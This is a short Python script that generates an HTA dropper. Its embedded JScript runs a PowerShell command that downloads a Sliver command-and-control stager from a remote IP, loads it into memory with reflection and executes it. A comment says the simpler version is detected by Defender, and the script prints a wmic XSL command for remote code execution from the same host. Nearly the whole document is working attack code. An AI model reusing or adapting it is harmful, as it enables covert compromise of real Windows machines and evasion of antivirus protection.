PAYLOAD = """powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/win_msf_sliver_stager.exe')\\";$assem = [System.Reflection.Assembly]::Load($data);[SliverStager.Stager]::Main()"""

## Raw payload gets detected by defender:
##PAYLOAD = "powershell.exe -c \"(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/run.txt')\""

TEMPLATE = f"""
       <html>
       <head>
       <script language="JScript">
       var shell = new ActiveXObject("WScript.Shell");
       var res = shell.Run("{PAYLOAD}");
       </script>
       </head>
       <body>
       <script language="JScript">
       self.close();
       </script>
       </body>
       </html>
"""

print(TEMPLATE)

print('Run with: wmic process get brief /format:"http://192.168.49.65/test.xsl"')
print('Or run locally')
